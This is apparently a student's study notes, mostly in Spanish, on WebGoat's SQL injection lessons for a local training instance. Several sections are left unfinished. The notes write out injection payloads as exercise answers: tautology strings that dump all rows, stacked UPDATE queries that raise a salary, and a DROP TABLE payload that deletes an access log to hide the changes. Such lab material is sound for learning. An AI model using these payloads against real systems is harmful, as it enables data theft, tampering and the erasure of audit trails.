# URL para ingresar a webgoat
+ http://localhost:8080/WebGoat/

# A1 Injection

La sección A1 de webgoat se refiere a las inyecciones SQL que son utilizadas para hacer que la aplicación se comporte de una manera no prevista por el desarrollador.

## SQL Injection (Intro)

### Ejercicio 1

El ejercicio número uno nos plantea una base de datos 


## SQL Injection (Advanced)

## SQL Injection (Mitigation)


# SQL => Structure Query Language
Modifica los datos
``` sql
SELECT department FROM Employees WHERE userid = '96134';
```

# DML => Data Manipulation Language
```sql
SELECT, INSERT, UPDATE, DELETE...

UPDATE Employees SET department = 'Sales' WHERE first_name = 'Tobi ';
```

# Data Definition Language (DDL)
+ If an attacker uses SQL injection of the DDL type to manipulate your database, he will violate the following of the three protection goals in information security: 
	+ integrity (alter) 
	+ availability (drop). 
	+ (Only people authorized to change/delete the data can do so.)

DDL commands are used for creating, modifying, and dropping the structure of database objects.

+ `CREATE` - to create a database and its objects like (table, views, ���)
+ `ALTER` - alters the structure of the existing database
+ `DROP` - delete objects from the database
Example:
``` sql
CREATE TABLE employees(
	userid varchar(6) not null primary key,
	first_name varchar(20),
	last_name varchar(20),
	department varchar(20),
	salary varchar(10),
	auth_tan varchar(6)
);
```

Now try to modify the scheme by adding the column "phone" (varchar(20)) to the table "employees". :
```sql
ALTER TABLE employees ADD COLUMN phone varchar(20);
```

# Data Control Language (DCL)

Data control language is used to create privileges to allow users to access and manipulate the database.

If an attacker uses SQL injection of the DCL type to manipulate your database, he will violate the following of the three protection goals in information security: 
+ confidentiality (grant) 
+ availability (revoke) 
+ (Unwanted people could grand themselves admin privileges or revoke the admin rights from an administrator)

DCL commands are used for providing security to database objects.
+ GRANT - allow users access privileges to the database
+ REVOKE - withdraw users access privileges given by using the GRANT command

Example:
```sql
GRANT CREATE TABLE
TO operator;
```
This statement gives all users of the `operator-role` the privilege to create new tables in the database.

Try to grant the usergroup "UnauthorizedUser" the right to alter tables:
```sql
GRANT ALTER TABLE TO UnauthorizedUser;
```



The query in the code builds a dynamic query as seen in the previous example. The query is build by concatenating strings making it susceptible to String SQL injection:

```sql
"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName  + "'";
"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + VARIABLE  + "'";
-- Una vez cambiado VARIABLE por (' OR '1' ='1)
"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + ' OR '1' ='1  + "'";

SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
```

Try It! Numeric SQL injection

The query in the code builds a dynamic query as seen in the previous example. The query in the code builds a dynamic query by concatenating a number making it susceptible to Numeric SQL injection:

```sql
"SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;
```
+ Using the two Input Fields below, try to retrieve all the data from the users table.
	+ Warning: Only one of these fields is susceptible to SQL Injection. You need to find out which, to successfully retrieve all the data.

```sql
"SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;
SELECT * From user_data WHERE Login_Count = 0 and userid= 1 OR TRUE
```

# Compromising confidentiality with String SQL injection

If queries are built dynamically in the application by concatenating strings to it, this makes it very susceptible to String SQL injection.

It is your turn!

You are an employee named John Smith working for a big company. The company has an internal system that allows all employees to see their own internal data - like the department they work in and their salary.

The system requires the employees to use a unique authentication TAN to view their data.
Your current TAN is 3SL99A.

Since you always have the urge to be the most earning employee, you want to exploit the system and instead of viewing your own internal data, _ you want to take a look at the data of all your colleagues_ to check their current salaries.

Use the form below and try to retrieve all employee data from the employees table. You should not need to know any specific names or TANs to get the information you need.
You already found out that the query performing your request looks like this:

```sql
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
```

```sql
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
```

You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.
Better go and change your own salary so you are earning the most!

Remember: Your name is John Smith and your current TAN is 3SL99A.

```sql
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
```
name => John
auth_tan => 3SL99A; UPDATE  employees SET SALARY = 90000 WHERE USERID = '37648
auth_tan => 3SL99A'; UPDATE  employees SET SALARY = 90000 WHERE auth_tan = '3SL99A

123'; UPDATE employees SET salary = 100000 WHERE auth_tan = '3SL99A


Now you are the top earner in your company. But do you see that? There seems to be a access_log table, where all your actions have been logged to!
Better go and delete it completely before anyone notices

```sql
';DROP TABLE access_log;--
```